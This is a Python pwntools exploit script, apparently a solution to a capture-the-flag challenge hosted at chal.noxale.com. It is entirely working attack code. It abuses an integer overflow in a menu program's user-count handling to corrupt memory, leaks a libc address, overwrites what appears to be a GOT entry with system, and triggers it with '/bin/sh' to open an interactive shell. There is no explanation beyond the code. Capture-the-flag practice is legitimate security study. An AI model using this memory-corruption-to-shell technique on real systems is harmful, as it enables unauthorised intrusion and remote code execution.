from pwn import *

HOST = "chal.noxale.com"
PORT = 31337
REMOTE = 1
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('13.125.131.113',PORT)
def add_user(name,money):
  s.recvuntil('choice:')
  s.sendline('1')
  s.recvuntil(':')
  s.sendline(name)
  s.recvuntil(':')
  s.sendline(str(money))

def add_users(i, info):
  s.recvuntil('choice:')
  s.sendline('2')
  s.recvuntil(':')
  s.sendline(str(i))
  for k in info:
    s.recvuntil(':')
    s.send('n')
    s.recvuntil(':')
    s.sendline(k[0])
    s.recvuntil(':')
    s.sendline(str(k[1]))
  s.recvuntil(':')
  s.send('Y')
def buy_computer(i, c_name, m_name, pay):
  s.recvuntil('choice:')
  s.sendline('3')
  s.recvuntil(':')
  s.sendline(str(i))
  s.recvuntil(':')
  s.sendline(c_name)
  s.recvuntil(':')
  s.sendline(m_name)
  s.recvuntil(':')
  s.sendline('Y')
  s.recvuntil(':')
  s.sendline(str(pay))
  s.recvuntil(':')
  s.sendline('Y')
def return_com(i,name):
  s.recvuntil('choice:')
  s.sendline('6')
  s.recvuntil(':')
  s.sendline(str(i))
  s.recvuntil(':')
  s.sendline(name)
def view(i):
  s.recvuntil('choice:')
  s.sendline('4')
  s.recvuntil(':')
  s.sendline(str(i))
def edit(i,name):
  s.recvuntil('choice:')
  s.sendline('5')
  s.recvuntil(':')
  s.sendline(str(i))
  s.recvuntil(':')
  s.sendline(name)
  s.recvuntil(':')
  s.sendline('1234')
for i in range(0x400):
  print i
  add_user("1234",1234)

add_users(0xffff,[ ["1234","1234"] for i in range(0x81)])
buy_computer(0,"1234","1234",1234)
return_com(0,"1234")
add_users(64383,[[p64(0x0604018)+p64(0),1234]])
view(1152)
libc = u64(s.recvuntil('\x7f')[-6:]+'\x00\x00') - 0x844f0
print "libc : ",hex(libc)
edit(1152,p64(libc+0x45390))
buy_computer(0,"1234","/bin/sh\x00",1234)
return_com(0,"1234")
s.interactive()
